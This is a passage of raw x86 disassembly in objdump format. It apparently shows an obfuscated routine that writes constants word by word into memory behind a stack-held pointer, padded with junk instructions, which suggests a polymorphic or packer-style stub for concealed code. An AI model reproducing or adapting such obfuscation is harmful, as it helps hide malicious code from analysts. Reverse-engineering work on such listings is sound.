  401be2:	2b c6                	sub    %esi,%eax
  401be4:	8d 99 fb da 40 00    	lea    0x40dafb(%ecx),%ebx
  401bea:	33 db                	xor    %ebx,%ebx
  401bec:	b3 04                	mov    $0x4,%bl
  401bee:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  401bf2:	2b c6                	sub    %esi,%eax
  401bf4:	8d 99 fb da 40 00    	lea    0x40dafb(%ecx),%ebx
  401bfa:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  401bfe:	b8 e0 f7 d1 33       	mov    $0x33d1f7e0,%eax
  401c03:	ab                   	stos   %eax,%es:(%edi)
  401c04:	8d 99 fb da 40 00    	lea    0x40dafb(%ecx),%ebx
  401c0a:	33 d2                	xor    %edx,%edx
  401c0c:	b2 04                	mov    $0x4,%dl
  401c0e:	01 54 24 e0          	add    %edx,-0x20(%esp)
  401c12:	03 dd                	add    %ebp,%ebx
  401c14:	8b ce                	mov    %esi,%ecx
  401c16:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401c1a:	c7 03 f1 8b 4c 24    	movl   $0x244c8bf1,(%ebx)
  401c20:	8b ce                	mov    %esi,%ecx
  401c22:	8b c3                	mov    %ebx,%eax
  401c24:	0f be c5             	movsbl %ch,%eax
  401c27:	33 d2                	xor    %edx,%edx
  401c29:	b2 04                	mov    $0x4,%dl
  401c2b:	01 54 24 e0          	add    %edx,-0x20(%esp)
  401c2f:	8b c3                	mov    %ebx,%eax
  401c31:	0f be c5             	movsbl %ch,%eax
  401c34:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  401c38:	c7 02 e0 81 01 dd    	movl   $0xdd0181e0,(%edx)
  401c3e:	0f be c5             	movsbl %ch,%eax
  401c41:	33 db                	xor    %ebx,%ebx
  401c43:	b3 04                	mov    $0x4,%bl
  401c45:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  401c49:	03 c2                	add    %edx,%eax
  401c4b:	0f b6 db             	movzbl %bl,%ebx
  401c4e:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  401c52:	b8 94 1e 90 81       	mov    $0x81901e94,%eax
  401c57:	ab                   	stos   %eax,%es:(%edi)
  401c58:	0f b6 db             	movzbl %bl,%ebx
  401c5b:	33 d2                	xor    %edx,%edx
  401c5d:	b2 04                	mov    $0x4,%dl
  401c5f:	01 54 24 e0          	add    %edx,-0x20(%esp)
  401c63:	33 f7                	xor    %edi,%esi
  401c65:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  401c69:	81 0a 31 9d d4 1e    	orl    $0x1ed49d31,(%edx)
  401c6f:	8b df                	mov    %edi,%ebx
  401c71:	8d 50 02             	lea    0x2(%eax),%edx
  401c74:	8d 68 02             	lea    0x2(%eax),%ebp
  401c77:	33 c9                	xor    %ecx,%ecx
  401c79:	b1 04                	mov    $0x4,%cl
  401c7b:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  401c7f:	8d 50 02             	lea    0x2(%eax),%edx
  401c82:	8d 68 02             	lea    0x2(%eax),%ebp
  401c85:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  401c89:	81 01 2d 33 f1 33    	addl   $0x33f1332d,(%ecx)
  401c8f:	8d 68 02             	lea    0x2(%eax),%ebp
  401c92:	66 0b f8             	or     %ax,%di
  401c95:	33 c0                	xor    %eax,%eax
  401c97:	b0 04                	mov    $0x4,%al
  401c99:	01 44 24 e0          	add    %eax,-0x20(%esp)
  401c9d:	66 0b f8             	or     %ax,%di
  401ca0:	8d 80 7d fd 40 00    	lea    0x40fd7d(%eax),%eax
  401ca6:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  401caa:	81 02 d2 b2 04 01    	addl   $0x104b2d2,(%edx)
  401cb0:	8d 80 7d fd 40 00    	lea    0x40fd7d(%eax),%eax
  401cb6:	33 d2                	xor    %edx,%edx
  401cb8:	b2 04                	mov    $0x4,%dl
  401cba:	01 54 24 e0          	add    %edx,-0x20(%esp)
  401cbe:	66 03 ca             	add    %dx,%cx
  401cc1:	03 f8                	add    %eax,%edi
  401cc3:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  401cc7:	b8 54 24 e0 66       	mov    $0x66e02454,%eax
  401ccc:	ab                   	stos   %eax,%es:(%edi)
  401ccd:	03 f8                	add    %eax,%edi
  401ccf:	33 c9                	xor    %ecx,%ecx
  401cd1:	b1 04                	mov    $0x4,%cl
  401cd3:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  401cd7:	f7 d6                	not    %esi
  401cd9:	f7 d5                	not    %ebp
  401cdb:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  401cdf:	b8 23 c3 8b 4c       	mov    $0x4c8bc323,%eax
  401ce4:	ab                   	stos   %eax,%es:(%edi)
  401ce5:	f7 d5                	not    %ebp
  401ce7:	33 db                	xor    %ebx,%ebx
  401ce9:	b3 04                	mov    $0x4,%bl
  401ceb:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  401cef:	f7 d5                	not    %ebp
  401cf1:	66 0b c1             	or     %cx,%ax
  401cf4:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401cf8:	81 03 24 e0 81 01    	addl   $0x181e024,(%ebx)
  401cfe:	66 0b c1             	or     %cx,%ax
  401d01:	66 03 f9             	add    %cx,%di
  401d04:	33 d2                	xor    %edx,%edx
  401d06:	b2 04                	mov    $0x4,%dl
  401d08:	01 54 24 e0          	add    %edx,-0x20(%esp)
  401d0c:	66 03 f9             	add    %cx,%di
  401d0f:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  401d13:	c7 01 c0 03 00 00    	movl   $0x3c0,(%ecx)
  401d19:	23 ee                	and    %esi,%ebp
  401d1b:	66 03 fa             	add    %dx,%di
  401d1e:	c1 e1 02             	shl    $0x2,%ecx
  401d21:	33 db                	xor    %ebx,%ebx
  401d23:	b3 04                	mov    $0x4,%bl
  401d25:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  401d29:	66 03 fa             	add    %dx,%di
  401d2c:	c1 e1 02             	shl    $0x2,%ecx
  401d2f:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401d33:	81 03 0f ac e8 03    	addl   $0x3e8ac0f,(%ebx)
  401d39:	c1 e1 02             	shl    $0x2,%ecx
  401d3c:	33 d2                	xor    %edx,%edx
  401d3e:	b2 04                	mov    $0x4,%dl
  401d40:	01 54 24 e0          	add    %edx,-0x20(%esp)
  401d44:	8d 49 02             	lea    0x2(%ecx),%ecx
  401d47:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  401d4b:	81 02 0b eb 0b d6    	addl   $0xd60beb0b,(%edx)
  401d51:	0b fe                	or     %esi,%edi
  401d53:	c1 e8 02             	shr    $0x2,%eax
  401d56:	33 c9                	xor    %ecx,%ecx
  401d58:	b1 04                	mov    $0x4,%cl
  401d5a:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  401d5e:	c1 e8 02             	shr    $0x2,%eax
  401d61:	8d 57 02             	lea    0x2(%edi),%edx
  401d64:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  401d68:	b8 33 c9 b1 04       	mov    $0x4b1c933,%eax
  401d6d:	ab                   	stos   %eax,%es:(%edi)
  401d6e:	8d 57 02             	lea    0x2(%edi),%edx
  401d71:	66 03 f1             	add    %cx,%si
  401d74:	33 c0                	xor    %eax,%eax
  401d76:	b0 04                	mov    $0x4,%al
  401d78:	01 44 24 e0          	add    %eax,-0x20(%esp)
  401d7c:	66 03 f1             	add    %cx,%si
  401d7f:	8d 91 ed d8 40 00    	lea    0x40d8ed(%ecx),%edx
  401d85:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  401d89:	81 02 01 4c 24 e0    	addl   $0xe0244c01,(%edx)
  401d8f:	8d 91 ed d8 40 00    	lea    0x40d8ed(%ecx),%edx
  401d95:	23 ee                	and    %esi,%ebp
  401d97:	33 c9                	xor    %ecx,%ecx
  401d99:	b1 04                	mov    $0x4,%cl
  401d9b:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  401d9f:	23 ee                	and    %esi,%ebp
  401da1:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401da5:	81 03 0b eb 8b 44    	addl   $0x448beb0b,(%ebx)
  401dab:	8b ce                	mov    %esi,%ecx
  401dad:	66 2b eb             	sub    %bx,%bp
  401db0:	33 d2                	xor    %edx,%edx
  401db2:	b2 04                	mov    $0x4,%dl
  401db4:	01 54 24 e0          	add    %edx,-0x20(%esp)
  401db8:	66 2b eb             	sub    %bx,%bp
  401dbb:	66 8b f0             	mov    %ax,%si
  401dbe:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  401dc2:	81 00 24 e0 81 00    	addl   $0x81e024,(%eax)
  401dc8:	66 8b f0             	mov    %ax,%si
  401dcb:	23 ef                	and    %edi,%ebp
  401dcd:	0f be c1             	movsbl %cl,%eax
  401dd0:	33 c0                	xor    %eax,%eax
  401dd2:	b0 04                	mov    $0x4,%al
  401dd4:	01 44 24 e0          	add    %eax,-0x20(%esp)
  401dd8:	23 ef                	and    %edi,%ebp
  401dda:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  401dde:	c7 00 85 ad 79 12    	movl   $0x1279ad85,(%eax)
  401de4:	0f be c1             	movsbl %cl,%eax
  401de7:	33 d2                	xor    %edx,%edx
  401de9:	b2 04                	mov    $0x4,%dl
  401deb:	01 54 24 e0          	add    %edx,-0x20(%esp)
  401def:	c1 e3 02             	shl    $0x2,%ebx
  401df2:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  401df6:	c7 01 81 30 04 6a    	movl   $0x6a043081,(%ecx)
  401dfc:	33 da                	xor    %edx,%ebx
  401dfe:	33 c9                	xor    %ecx,%ecx
  401e00:	b1 04                	mov    $0x4,%cl
  401e02:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  401e06:	85 ce                	test   %ecx,%esi
  401e08:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  401e0c:	c7 00 79 02 0b d6    	movl   $0xd60b0279,(%eax)
  401e12:	66 85 f6             	test   %si,%si
  401e15:	33 c0                	xor    %eax,%eax
  401e17:	b0 04                	mov    $0x4,%al
  401e19:	01 44 24 e0          	add    %eax,-0x20(%esp)
  401e1d:	66 03 d6             	add    %si,%dx
  401e20:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  401e24:	c7 02 33 c5 66 23    	movl   $0x2366c533,(%edx)
  401e2a:	2b d5                	sub    %ebp,%edx
  401e2c:	85 f7                	test   %esi,%edi
  401e2e:	81 cb 6f da 40 00    	or     $0x40da6f,%ebx
  401e34:	33 c9                	xor    %ecx,%ecx
  401e36:	b1 04                	mov    $0x4,%cl
  401e38:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  401e3c:	85 f7                	test   %esi,%edi
  401e3e:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  401e42:	c7 01 db 33 c9 b1    	movl   $0xb1c933db,(%ecx)
  401e48:	81 cb 6f da 40 00    	or     $0x40da6f,%ebx
  401e4e:	33 d2                	xor    %edx,%edx
  401e50:	b2 04                	mov    $0x4,%dl
  401e52:	01 54 24 e0          	add    %edx,-0x20(%esp)
  401e56:	81 df f9 f8 40 00    	sbb    $0x40f8f9,%edi
  401e5c:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  401e60:	81 02 04 01 4c 24    	addl   $0x244c0104,(%edx)
  401e66:	0f b6 cf             	movzbl %bh,%ecx
  401e69:	33 c9                	xor    %ecx,%ecx
  401e6b:	b1 04                	mov    $0x4,%cl
  401e6d:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  401e71:	66 33 d6             	xor    %si,%dx
  401e74:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  401e78:	b8 e0 33 c5 66       	mov    $0x66c533e0,%eax
  401e7d:	ab                   	stos   %eax,%es:(%edi)
  401e7e:	8d 4a 02             	lea    0x2(%edx),%ecx
  401e81:	85 fb                	test   %edi,%ebx
  401e83:	33 c9                	xor    %ecx,%ecx
  401e85:	b1 04                	mov    $0x4,%cl
  401e87:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  401e8b:	85 fb                	test   %edi,%ebx
  401e8d:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  401e91:	81 01 23 db 8b 54    	addl   $0x548bdb23,(%ecx)
  401e97:	66 0b ee             	or     %si,%bp
  401e9a:	81 ef 68 fa 40 00    	sub    $0x40fa68,%edi
  401ea0:	33 c0                	xor    %eax,%eax
  401ea2:	b0 04                	mov    $0x4,%al
  401ea4:	01 44 24 e0          	add    %eax,-0x20(%esp)
  401ea8:	81 ef 68 fa 40 00    	sub    $0x40fa68,%edi
  401eae:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401eb2:	c7 03 24 e0 81 02    	movl   $0x281e024,(%ebx)
  401eb8:	66 2b c3             	sub    %bx,%ax
  401ebb:	0f be dc             	movsbl %ah,%ebx
  401ebe:	33 db                	xor    %ebx,%ebx
  401ec0:	b3 04                	mov    $0x4,%bl
  401ec2:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  401ec6:	0f be dc             	movsbl %ah,%ebx
  401ec9:	66 33 df             	xor    %di,%bx
  401ecc:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401ed0:	81 03 0e f7 f7 82    	addl   $0x82f7f70e,(%ebx)
  401ed6:	66 33 df             	xor    %di,%bx
  401ed9:	0b d1                	or     %ecx,%edx
  401edb:	66 0b ee             	or     %si,%bp
  401ede:	33 c0                	xor    %eax,%eax
  401ee0:	b0 04                	mov    $0x4,%al
  401ee2:	01 44 24 e0          	add    %eax,-0x20(%esp)
  401ee6:	0b d1                	or     %ecx,%edx
  401ee8:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401eec:	81 0b 81 32 0e f7    	orl    $0xf70e3281,(%ebx)
  401ef2:	66 0b ee             	or     %si,%bp
  401ef5:	33 c0                	xor    %eax,%eax
  401ef7:	b0 04                	mov    $0x4,%al
  401ef9:	01 44 24 e0          	add    %eax,-0x20(%esp)
  401efd:	23 cb                	and    %ebx,%ecx
  401eff:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  401f03:	81 00 a0 3c 66 23    	addl   $0x23663ca0,(%eax)
  401f09:	33 eb                	xor    %ebx,%ebp
  401f0b:	33 db                	xor    %ebx,%ebx
  401f0d:	b3 04                	mov    $0x4,%bl
  401f0f:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  401f13:	81 ea ff dc 40 00    	sub    $0x40dcff,%edx
  401f19:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401f1d:	c7 03 db 66 03 c9    	movl   $0xc90366db,(%ebx)
  401f23:	66 0b d7             	or     %di,%dx
  401f26:	8d 73 02             	lea    0x2(%ebx),%esi
  401f29:	33 d2                	xor    %edx,%edx
  401f2b:	b2 04                	mov    $0x4,%dl
  401f2d:	01 54 24 e0          	add    %edx,-0x20(%esp)
  401f31:	8d 73 02             	lea    0x2(%ebx),%esi
  401f34:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  401f38:	81 02 66 33 c7 33    	addl   $0x33c73366,(%edx)
  401f3e:	66 8b cd             	mov    %bp,%cx
  401f41:	33 c0                	xor    %eax,%eax
  401f43:	b0 04                	mov    $0x4,%al
  401f45:	01 44 24 e0          	add    %eax,-0x20(%esp)
  401f49:	66 33 f6             	xor    %si,%si
  401f4c:	2b cb                	sub    %ebx,%ecx
  401f4e:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  401f52:	81 09 c0 b0 04 01    	orl    $0x104b0c0,(%ecx)
  401f58:	2b cb                	sub    %ebx,%ecx
  401f5a:	33 c0                	xor    %eax,%eax
  401f5c:	b0 04                	mov    $0x4,%al
  401f5e:	01 44 24 e0          	add    %eax,-0x20(%esp)
  401f62:	66 2b fa             	sub    %dx,%di
  401f65:	bf 6a fe 40 00       	mov    $0x40fe6a,%edi
  401f6a:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  401f6e:	81 01 44 24 e0 66    	addl   $0x66e02444,(%ecx)
  401f74:	bf 6a fe 40 00       	mov    $0x40fe6a,%edi
  401f79:	33 c0                	xor    %eax,%eax
  401f7b:	b0 04                	mov    $0x4,%al
  401f7d:	01 44 24 e0          	add    %eax,-0x20(%esp)
  401f81:	0f b6 c5             	movzbl %ch,%eax
  401f84:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  401f88:	c7 02 03 c9 8b 54    	movl   $0x548bc903,(%edx)
  401f8e:	66 03 fe             	add    %si,%di
  401f91:	33 d2                	xor    %edx,%edx
  401f93:	b2 04                	mov    $0x4,%dl
  401f95:	01 54 24 e0          	add    %edx,-0x20(%esp)
  401f99:	66 03 c5             	add    %bp,%ax
  401f9c:	0b c2                	or     %edx,%eax
  401f9e:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  401fa2:	c7 03 24 e0 81 02    	movl   $0x281e024,(%ebx)
  401fa8:	0b c2                	or     %edx,%eax
  401faa:	33 d2                	xor    %edx,%edx
  401fac:	b2 04                	mov    $0x4,%dl
  401fae:	01 54 24 e0          	add    %edx,-0x20(%esp)
  401fb2:	66 85 db             	test   %bx,%bx
  401fb5:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  401fb9:	81 02 32 ff 70 2b    	addl   $0x2b70ff32,(%edx)
  401fbf:	66 85 fa             	test   %di,%dx
  401fc2:	33 c0                	xor    %eax,%eax
  401fc4:	b0 04                	mov    $0x4,%al
  401fc6:	01 44 24 e0          	add    %eax,-0x20(%esp)
  401fca:	66 8b f0             	mov    %ax,%si
  401fcd:	8d 45 02             	lea    0x2(%ebp),%eax
  401fd0:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  401fd4:	81 00 66 33 c7 0f    	addl   $0xfc73366,(%eax)
  401fda:	8d 45 02             	lea    0x2(%ebp),%eax
  401fdd:	66 8b cb             	mov    %bx,%cx
  401fe0:	33 db                	xor    %ebx,%ebx
  401fe2:	b3 04                	mov    $0x4,%bl
  401fe4:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  401fe8:	66 8b cb             	mov    %bx,%cx
  401feb:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  401fef:	b8 be ce 33 d2       	mov    $0xd233cebe,%eax
  401ff4:	ab                   	stos   %eax,%es:(%edi)
  401ff5:	83 c3 02             	add    $0x2,%ebx
  401ff8:	33 c0                	xor    %eax,%eax
  401ffa:	b0 04                	mov    $0x4,%al
  401ffc:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402000:	66 33 c8             	xor    %ax,%cx
  402003:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402007:	c7 02 b2 04 01 54    	movl   $0x540104b2,(%edx)
  40200d:	66 2b ca             	sub    %dx,%cx
  402010:	33 db                	xor    %ebx,%ebx
  402012:	b3 04                	mov    $0x4,%bl
  402014:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  402018:	8d 41 02             	lea    0x2(%ecx),%eax
  40201b:	66 33 c6             	xor    %si,%ax
  40201e:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402022:	c7 02 24 e0 0f be    	movl   $0xbe0fe024,(%edx)
  402028:	66 33 c6             	xor    %si,%ax
  40202b:	33 c0                	xor    %eax,%eax
  40202d:	b0 04                	mov    $0x4,%al
  40202f:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402033:	03 f7                	add    %edi,%esi
  402035:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402039:	c7 00 ce 8b 44 24    	movl   $0x24448bce,(%eax)
  40203f:	23 ff                	and    %edi,%edi
  402041:	2b c2                	sub    %edx,%eax
  402043:	66 8b c7             	mov    %di,%ax
  402046:	33 db                	xor    %ebx,%ebx
  402048:	b3 04                	mov    $0x4,%bl
  40204a:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  40204e:	2b c2                	sub    %edx,%eax
  402050:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  402054:	b8 e0 81 00 e8       	mov    $0xe80081e0,%eax
  402059:	ab                   	stos   %eax,%es:(%edi)
  40205a:	66 8b c7             	mov    %di,%ax
  40205d:	33 db                	xor    %ebx,%ebx
  40205f:	b3 04                	mov    $0x4,%bl
  402061:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  402065:	95                   	xchg   %eax,%ebp
  402066:	83 c1 02             	add    $0x2,%ecx
  402069:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  40206d:	81 02 15 00 00 66    	addl   $0x66000015,(%edx)
  402073:	83 c1 02             	add    $0x2,%ecx
  402076:	33 d2                	xor    %edx,%edx
  402078:	b2 04                	mov    $0x4,%dl
  40207a:	01 54 24 e0          	add    %edx,-0x20(%esp)
  40207e:	f7 d1                	not    %ecx
  402080:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402084:	c7 02 8b f0 66 8b    	movl   $0x8b66f08b,(%edx)
  40208a:	c1 e5 02             	shl    $0x2,%ebp
  40208d:	66 85 ea             	test   %bp,%dx
  402090:	0f ac e8 03          	shrd   $0x3,%ebp,%eax
  402094:	33 c0                	xor    %eax,%eax
  402096:	b0 04                	mov    $0x4,%al
  402098:	01 44 24 e0          	add    %eax,-0x20(%esp)
  40209c:	66 85 ea             	test   %bp,%dx
  40209f:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  4020a3:	81 09 f7 33 c0 b0    	orl    $0xb0c033f7,(%ecx)
  4020a9:	0f ac e8 03          	shrd   $0x3,%ebp,%eax
  4020ad:	33 d2                	xor    %edx,%edx
  4020af:	b2 04                	mov    $0x4,%dl
  4020b1:	01 54 24 e0          	add    %edx,-0x20(%esp)
  4020b5:	81 c5 f8 da 40 00    	add    $0x40daf8,%ebp
  4020bb:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  4020bf:	81 01 04 01 44 24    	addl   $0x24440104,(%ecx)
  4020c5:	66 8b f2             	mov    %dx,%si
  4020c8:	66 85 fa             	test   %di,%dx
  4020cb:	33 db                	xor    %ebx,%ebx
  4020cd:	b3 04                	mov    $0x4,%bl
  4020cf:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  4020d3:	66 85 fa             	test   %di,%dx
  4020d6:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  4020da:	81 00 e0 66 8b f7    	addl   $0xf78b66e0,(%eax)
  4020e0:	66 33 fb             	xor    %bx,%di
  4020e3:	66 2b ed             	sub    %bp,%bp
  4020e6:	33 c9                	xor    %ecx,%ecx
  4020e8:	b1 04                	mov    $0x4,%cl
  4020ea:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  4020ee:	66 2b ed             	sub    %bp,%bp
  4020f1:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  4020f5:	c7 00 8b 44 24 e0    	movl   $0xe024448b,(%eax)
  4020fb:	66 0b c1             	or     %cx,%ax
  4020fe:	33 d2                	xor    %edx,%edx
  402100:	b2 04                	mov    $0x4,%dl
  402102:	01 54 24 e0          	add    %edx,-0x20(%esp)
  402106:	8d 86 e9 fd 40 00    	lea    0x40fde9(%esi),%eax
  40210c:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402110:	81 00 81 00 00 bf    	addl   $0xbf000081,(%eax)
  402116:	66 85 d2             	test   %dx,%dx
  402119:	33 db                	xor    %ebx,%ebx
  40211b:	b3 04                	mov    $0x4,%bl
  40211d:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  402121:	2b ef                	sub    %edi,%ebp
  402123:	8d 4e 02             	lea    0x2(%esi),%ecx
  402126:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  40212a:	81 01 00 50 c1 e2    	addl   $0xe2c15000,(%ecx)
  402130:	8d 4e 02             	lea    0x2(%esi),%ecx
  402133:	33 df                	xor    %edi,%ebx
  402135:	33 d0                	xor    %eax,%edx
  402137:	8b ca                	mov    %edx,%ecx
  402139:	33 db                	xor    %ebx,%ebx
  40213b:	b3 04                	mov    $0x4,%bl
  40213d:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  402141:	33 df                	xor    %edi,%ebx
  402143:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402147:	c7 00 02 66 0b c7    	movl   $0xc70b6602,(%eax)
  40214d:	33 d0                	xor    %eax,%edx
  40214f:	33 d2                	xor    %edx,%edx
  402151:	b2 04                	mov    $0x4,%dl
  402153:	01 54 24 e0          	add    %edx,-0x20(%esp)
  402157:	8b ca                	mov    %edx,%ecx
  402159:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  40215d:	81 00 33 d2 b2 04    	addl   $0x4b2d233,(%eax)
  402163:	66 0b dd             	or     %bp,%bx
  402166:	33 d2                	xor    %edx,%edx
  402168:	b2 04                	mov    $0x4,%dl
  40216a:	01 54 24 e0          	add    %edx,-0x20(%esp)
  40216e:	66 85 c0             	test   %ax,%ax
  402171:	f7 e1                	mul    %ecx
  402173:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  402177:	c7 03 01 54 24 e0    	movl   $0xe0245401,(%ebx)
  40217d:	f7 e1                	mul    %ecx
  40217f:	8b d2                	mov    %edx,%edx
  402181:	66 2b f5             	sub    %bp,%si
  402184:	33 d2                	xor    %edx,%edx
  402186:	b2 04                	mov    $0x4,%dl
  402188:	01 54 24 e0          	add    %edx,-0x20(%esp)
  40218c:	8b d2                	mov    %edx,%edx
  40218e:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402192:	c7 02 66 0b c7 8b    	movl   $0x8bc70b66,(%edx)
  402198:	66 2b f5             	sub    %bp,%si
  40219b:	33 c9                	xor    %ecx,%ecx
  40219d:	b1 04                	mov    $0x4,%cl
  40219f:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  4021a3:	66 8b d8             	mov    %ax,%bx
  4021a6:	85 ed                	test   %ebp,%ebp
  4021a8:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  4021ac:	c7 02 5c 24 e0 81    	movl   $0x81e0245c,(%edx)
  4021b2:	85 ed                	test   %ebp,%ebp
  4021b4:	66 33 fb             	xor    %bx,%di
  4021b7:	33 c0                	xor    %eax,%eax
  4021b9:	b0 04                	mov    $0x4,%al
  4021bb:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4021bf:	66 33 fb             	xor    %bx,%di
  4021c2:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  4021c6:	81 01 03 4e aa 47    	addl   $0x47aa4e03,(%ecx)
  4021cc:	03 dd                	add    %ebp,%ebx
  4021ce:	33 db                	xor    %ebx,%ebx
  4021d0:	b3 04                	mov    $0x4,%bl
  4021d2:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  4021d6:	66 33 f6             	xor    %si,%si
  4021d9:	66 0b f0             	or     %ax,%si
  4021dc:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  4021e0:	81 01 7e 81 33 0f    	addl   $0xf33817e,(%ecx)
  4021e6:	66 0b f0             	or     %ax,%si
  4021e9:	33 c0                	xor    %eax,%eax
  4021eb:	b0 04                	mov    $0x4,%al
  4021ed:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4021f1:	0f be d8             	movsbl %al,%ebx
  4021f4:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  4021f8:	c7 02 aa fa 7e 81    	movl   $0x817efaaa,(%edx)
  4021fe:	f7 d6                	not    %esi
  402200:	66 0b db             	or     %bx,%bx
  402203:	33 d2                	xor    %edx,%edx
  402205:	b2 04                	mov    $0x4,%dl
  402207:	01 54 24 e0          	add    %edx,-0x20(%esp)
  40220b:	66 0b db             	or     %bx,%bx
  40220e:	0f be c0             	movsbl %al,%eax
  402211:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402215:	81 00 f1 f9 fd 40    	addl   $0x40fdf9f1,(%eax)
  40221b:	0f be c0             	movsbl %al,%eax
  40221e:	33 c9                	xor    %ecx,%ecx
  402220:	b1 04                	mov    $0x4,%cl
  402222:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  402226:	66 8b c1             	mov    %cx,%ax
  402229:	03 f9                	add    %ecx,%edi
  40222b:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  40222f:	b8 00 33 d2 b2       	mov    $0xb2d23300,%eax
  402234:	ab                   	stos   %eax,%es:(%edi)
  402235:	03 f9                	add    %ecx,%edi
  402237:	2b d1                	sub    %ecx,%edx
  402239:	81 c3 7b de 40 00    	add    $0x40de7b,%ebx
  40223f:	33 c0                	xor    %eax,%eax
  402241:	b0 04                	mov    $0x4,%al
  402243:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402247:	2b d1                	sub    %ecx,%edx
  402249:	81 c3 7b de 40 00    	add    $0x40de7b,%ebx
  40224f:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  402253:	c7 03 04 01 54 24    	movl   $0x24540104,(%ebx)
  402259:	81 c3 7b de 40 00    	add    $0x40de7b,%ebx
  40225f:	66 23 df             	and    %di,%bx
  402262:	33 d2                	xor    %edx,%edx
  402264:	b2 04                	mov    $0x4,%dl
  402266:	01 54 24 e0          	add    %edx,-0x20(%esp)
  40226a:	66 23 df             	and    %di,%bx
  40226d:	66 23 fe             	and    %si,%di
  402270:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  402274:	81 03 e0 c1 ed 02    	addl   $0x2edc1e0,(%ebx)
  40227a:	66 23 fe             	and    %si,%di
  40227d:	66 2b f9             	sub    %cx,%di
  402280:	33 db                	xor    %ebx,%ebx
  402282:	b3 04                	mov    $0x4,%bl
  402284:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  402288:	66 2b f9             	sub    %cx,%di
  40228b:	8b 44 24 e0          	mov    -0x20(%esp),%eax
